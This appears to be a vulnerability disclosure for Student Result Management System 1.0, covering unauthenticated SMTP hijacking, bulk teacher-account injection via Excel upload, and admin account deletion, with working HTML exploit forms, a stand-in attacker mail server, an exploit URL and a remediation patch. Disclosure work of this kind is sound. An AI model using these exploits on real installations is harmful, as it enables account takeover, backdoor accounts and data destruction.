# 🛡️ Security Advisory: Multiple Critical Access Control Vulnerabilities in SRMS 1.0

> **Target Application**: Student Result Management System (SRMS) 1.0  
> **Vendor**: SourceCodester  
> **Software Link**: (https://www.sourcecodester.com/srms-makumbusho)  
> **Security Researcher**: yan1451 
> **Disclosure Date**: 2026-02-11  
> **Status**: 0-Day (Unpatched)  

---

## 📑 Executive Summary

During a comprehensive white-box security audit of the **Student Result Management System (SRMS) 1.0**, two critical security vulnerabilities were identified in the administrative core modules.

These vulnerabilities stem from a systemic failure to enforce **Authentication** and **Authorization** checks in sensitive backend scripts. A remote, unauthenticated attacker can exploit these flaws to:
1.  **Hijack the system's email infrastructure**, leading to a full **Account Takeover (ATO)** of the Super Administrator.
2.  **Execute a Mass Account Injection attack**, creating arbitrary privileged accounts (Teachers) via malicious file upload.

---

## 🚨 Vulnerability 1: Unauthenticated SMTP Configuration Hijacking

| Attribute | Details |
| :--- | :--- |
| **Vulnerability Type** | Broken Access Control / Improper Authorization |
| **CWE ID** | CWE-284, CWE-862 |
| **Severity** | 🔥 **Critical** |
| **CVSS v3.1 Score** | **9.1** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Vulnerable Component** | `/srms/script/admin/core/update_smtp.php` |

### 🔍 1.1 Technical Description
The application exposes a critical endpoint `update_smtp.php` which is responsible for updating the global SMTP (Simple Mail Transfer Protocol) configuration.

The root cause of this vulnerability is the **absence of session validation mechanisms**. While the script initializes a session via `session_start()`, it fails to verify:
1.  Whether the session is valid (User is logged in).
2.  Whether the user possesses the required `admin` privileges (`level == 0`).

As a result, any unauthenticated user can send a direct `POST` request to this endpoint and overwrite the system's mail server settings.

### 🐛 1.2 Vulnerable Code Analysis
**File:** `script/admin/core/update_smtp.php`

```php
<?php
chdir('../../');
session_start(); 
// ❌ VULNERABILITY: No check_session.php included.
// ❌ VULNERABILITY: No check for $_SESSION['level'].

require_once('db/config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Attackers can manipulate these variables directly
    $smtp_server = $_POST['mail_server'];
    $smtp_username = $_POST['mail_username'];
    $smtp_password = $_POST['mail_password'];
    $smtp_port = $_POST['mail_port'];
    $smtp_security = $_POST['mail_security'];

    // Direct Database UPDATE execution
    $stmt = $conn->prepare("UPDATE tbl_smtp SET server = ?, username = ?, password = ?, port = ?, security = ? WHERE id = 1");
    $stmt->execute([$smtp_server, $smtp_username, $smtp_password, $smtp_port, $smtp_security]);
}
?>
```

### ⚔️ 1.3 Proof of Concept (Exploit)

**Attack Scenario:**
An attacker modifies the SMTP settings to point to a malicious mail server (`smtp.attacker.com`). When the administrator (or any user) requests a password reset, the token is sent to the attacker's server instead of the legitimate email provider.

**Exploit Payload (HTML):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>SRMS SMTP Hijacking PoC</title>
    <style>
        body { font-family: sans-serif; padding: 40px; background: #333; color: white; }
        .exploit-box { border: 2px solid #ff0000; padding: 20px; background: #000; }
        h2 { color: #ff0000; }
        input[type=text] { width: 100%; padding: 10px; margin: 5px 0; }
        input[type=submit] { background: #ff0000; color: white; padding: 15px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>
    <div class="exploit-box">
        <h2>🔥 SMTP Configuration Hijack Exploit</h2>
        <p>Target: /admin/core/update_smtp.php (Unauthenticated)</p>
        
        <form action="http://localhost/srms/script/admin/core/update_smtp.php" method="POST">
            
            <label>Mail Server (Hijacked):</label>
            <input type="text" name="mail_server" value="smtp.attacker.com">
            
            <label>Username (Hijacked):</label>
            <input type="text" name="mail_username" value="hacker@evil.com">
            
            <label>Password:</label>
            <input type="text" name="mail_password" value="pwned123">
            
            <label>Port:</label>
            <input type="text" name="mail_port" value="6666">
            
            <label>Security:</label>
            <input type="text" name="mail_security" value="none">
            
            <br><br>
            <input type="submit" value=">>> EXECUTE ATTACK (执行劫持) <<<">
        </form>
    </div>
</body>
</html>
```

### 📸 1.4 Evidence

**Step 1: Pre-Attack State (Unauthenticated)**
The attacker is on the login page, confirming no active session.

<img width="2553" height="1537" alt="981b6bb8edd74e7461940071e98bdbe8" src="https://github.com/user-attachments/assets/30c6bf7c-e216-4dca-8b99-3a2962860bfa" />
> *Figure 1: Proof that the attacker is not logged in.*

**Step 2: Post-Attack Verification**
After executing the payload, the administrative dashboard reflects the hijacked settings.

<img width="2541" height="1516" alt="335799a1e7704e26f77fba0dcdae8852" src="https://github.com/user-attachments/assets/14985b84-f6fe-4234-84af-07bde98b664a" />
> *Figure 2: The SMTP settings have been successfully modified by the external attacker.*

---

## 🚨 Vulnerability 2: Unauthenticated Bulk Account Injection (Arbitrary File Upload)

| Attribute | Details |
| :--- | :--- |
| **Vulnerability Type** | Authentication Bypass / Unrestricted Upload |
| **CWE ID** | CWE-434, CWE-306 |
| **Severity** | 🔥 **Critical** |
| **CVSS v3.1 Score** | **9.8** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Vulnerable Component** | `/srms/script/admin/core/import_users.php` |

### 🔍 2.1 Technical Description
The `import_users.php` script is designed to parse uploaded Excel files and batch-create user accounts. Similar to the SMTP vulnerability, this endpoint lacks access control lists (ACLs).

The script accepts a file via `$_FILES['file']`, parses it using `SimpleXLSX`, and iterates through rows to insert data into the `tbl_staff` table. The injected accounts are automatically assigned the role of **Teacher (Level 2)** and can be set to "Active" status instantly.

### 🐛 2.2 Vulnerable Code Analysis
**File:** `script/admin/core/import_users.php`

```php
<?php
session_start();
// ❌ VULNERABILITY: Missing authentication check.
require_once('db/config.php');
require_once('const/phpexcel/SimpleXLSX.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. Accepts file upload from any source
    $file = $_FILES['file']['tmp_name']; 
    
    if ( $xlsx = SimpleXLSX::parse($file) ) {
        foreach( $xlsx->rows() as $r ) {
            // 2. Maps Excel columns to database fields
            $fname = ucfirst($r[0]); 
            $email = $r[2];
            $status = $r[4]; // If "Active", account is usable immediately
            
            // 3. Inserts into database without validation
            $stmt = $conn->prepare("INSERT INTO tbl_staff ...");
            $stmt->execute(...);
        }
    }
}
?>
```

### ⚔️ 2.3 Proof of Concept (Exploit)

**Step 1: Payload Construction (`evil.xlsx`)**
The attacker must craft an Excel file matching the parser's logic.

| Excel Column | Index | Database Mapping | Malicious Value |
| :--- | :--- | :--- | :--- |
| **A** | 0 | First Name | `Hacker` |
| **B** | 1 | Last Name | `Inject` |
| **C** | 2 | Email | `backdoor@pwned.com` |
| **D** | 3 | Gender | `Male` |
| **E** | 4 | Status | `Active` (Required for login) |
| **F** | 5 | Password | `123456` |

**Step 2: Exploit Launcher (HTML)**

```html
<!DOCTYPE html>
<html>
<head>
    <title>SRMS Bulk Import Exploit</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 40px; }
        .box { border: 2px solid #f00; padding: 20px; max-width: 600px; margin: 0 auto; }
        h2 { color: #f00; text-align: center; }
        label { font-size: 1.2em; }
        input[type="submit"] { background: #f00; color: #fff; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 1.2em; margin-top: 20px;}
        input[type="submit"]:hover { background: #fff; color: #f00; }
    </style>
</head>
<body>
    <div class="box">
        <h2>☢️ 批量教师账户投毒 (Bulk Inject)</h2>
        <p>Target: <code>/admin/core/import_users.php</code></p>
        
        <form action="http://localhost/srms/script/admin/core/import_users.php" method="POST" enctype="multipart/form-data">
            
            <label>上传构造好的恶意 Excel (.xlsx):</label><br><br>
            <input type="file" name="file" accept=".xlsx" required>
            
            <br><br>
            <input type="submit" value=">>> 执行投毒 (UPLOAD) <<<">
        </form>
    </div>
</body>
</html>
```

### 📸 2.4 Evidence

**Step 1: Execution**
Uploading the malicious payload without logging in.

<img width="2495" height="1479" alt="625f92e6893ab1dce1bd41d4d11fb215" src="https://github.com/user-attachments/assets/8e4bcbd1-0336-4cd8-92a1-1ce6d84ec2d3" />
> *Figure 3: Uploading the malicious Excel file without authentication.*

**Step 2: Impact Verification**
The injected account appears in the "Teachers" list and is fully operational.

<img width="2545" height="1524" alt="f0cc0dd7880ae774739dd35d16ffae62" src="https://github.com/user-attachments/assets/e22ec6ba-ade8-412f-8cec-cc77a3b2bd4d" />
> *Figure 4: The malicious account "Hacker Inject" is visible in the admin panel.*

---

---

## Vulnerability 3: Unauthenticated Arbitrary Account Deletion (DoS)
**Severity**: 🔥 **Critical (CVSS ~8.2)** | **Component**: `/admin/core/drop_user.php` | **CWE-284**

### 🔍 Technical Analysis
The file `srms/script/admin/core/drop_user.php` is designed to delete staff accounts from the database. Critical analysis reveals that this file **completely lacks session validation or access control mechanisms** (e.g., `check_session.php` is missing).

The script accepts an `id` parameter via a GET request and executes a `DELETE` query against the `tbl_staff` table. Since the **Super Administrator** account is also stored in this table (typically assigned `ID=1`), an unauthenticated attacker can permanently delete the administrator account, causing a permanent **Denial of Service (DoS)** condition.

**Vulnerable Code Snippet:**
```php
// srms/script/admin/core/drop_user.php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $id = $_GET['id'];
    
    // 🚨 CRITICAL VULNERABILITY: 
    // Direct database deletion without verifying if the user is logged in or is an Admin.
    $stmt = $conn->prepare("DELETE FROM tbl_staff WHERE id = ?");
    $stmt->execute([$id]);

    // Developer Error: The success message incorrectly says "Academic deleted" 
    // because the code was likely copy-pasted from 'drop_academic.php'.
    $_SESSION['reply'] = array (array("success",'Academic deleted successfully'));
    header("location:../academic");
}
```

### ⚔️ Proof of Concept (Exploit)

**Attack Scenario:**
An attacker wants to sabotage the system by removing the main administrator.

**Exploit URL:**
```text
http://localhost/srms/script/admin/core/drop_user.php?id=1
```

**Step 1: Execution**
The attacker navigates to the exploit URL in a browser or uses cURL.

**Step 2: Verification (The "Smoking Gun")**
The application redirects the user and displays a success message: **"Academic deleted successfully"**.
*Note: The message says "Academic" due to a coding error by the developer, but the SQL query `DELETE FROM tbl_staff` has successfully executed against the user table.*

<img width="2552" height="1529" alt="16903606e1d51d9694dad9acfc3c2d6d" src="https://github.com/user-attachments/assets/b4408cef-bd1a-42a7-9a96-e621d5567167" />
> *Figure 5: The "Academic deleted successfully" message confirms the Admin account (ID 1) has been wiped from the database without authentication.*

---

## 🛡️ Remediation Strategy

To mitigate these vulnerabilities, the vendor must enforce strict **Session-Based Access Control** at the beginning of all administrative scripts.

**Recommended Patch:**
Apply the following code block to the top of `update_smtp.php` and `import_users.php`:

```php
session_start();

// Check if user is logged in AND is an Administrator (Level 0)
if (!isset($_SESSION['level']) || $_SESSION['level'] != '0') {
    // Log invalid access attempt
    error_log("Unauthorized access attempt from " . $_SERVER['REMOTE_ADDR']);
    // Redirect to login page
    header("location: ../../");
    exit();
}
```

---

## ⚠️ Disclaimer
> This report is intended for educational purposes and security research only. The author takes no responsibility for the misuse of this information. The vulnerabilities were discovered in a controlled, local environment.
